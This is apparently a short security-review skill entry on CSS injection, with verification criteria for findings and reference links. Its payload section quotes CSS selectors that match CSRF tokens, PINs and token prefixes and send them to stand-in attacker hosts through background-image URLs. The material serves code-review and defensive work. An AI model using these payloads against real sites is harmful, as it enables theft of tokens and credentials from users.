# CSS Injection — @cascade skill
> cats: (advisory — no static taint rule yet) · severity: medium
> sources: PayloadsAllTheThings, HackTricks

## What it is
CSS selectors can be used to exfiltrate data. This technique is particularly useful because CSS is often allowed in CSP rules, whereas JavaScript is frequently blocked.

## Exploit payloads (from PayloadsAllTheThings)
- `input[value^="TOKEN_012"] {`
- `background-image: url(http://attacker.example.com/?prefix=TOKEN_012);`
- `}`
- `input[name="pin"][value="1234"] {`
- `background: url(https://[ATTACKER.DOMAIN.TLD]/log?pin=1234);`
- `}`
- `input[name="csrf-token"][value^="a"] + input {`
- `background: url(https://[ATTACKER.DOMAIN.TLD]/?q=a)`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSS%20Injection
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=CSS%20Injection
- HackTricks Cloud: https://cloud.hacktricks.wiki/

## HackTricks pages (3)

- [CSS Injection](https://hacktricks.wiki/en/pentesting-web/xs-search/css-injection/README)
- [CSS Injection Code](https://hacktricks.wiki/en/pentesting-web/xs-search/css-injection/css-injection-code)
- [LESS Code Injection: Local File Read, SSRF & RCE](https://hacktricks.wiki/en/pentesting-web/xs-search/css-injection/less-code-injection)

## References
- HackTricks: https://hacktricks.wiki/en/
- HackTricks repo: https://github.com/HackTricks-wiki/hacktricks
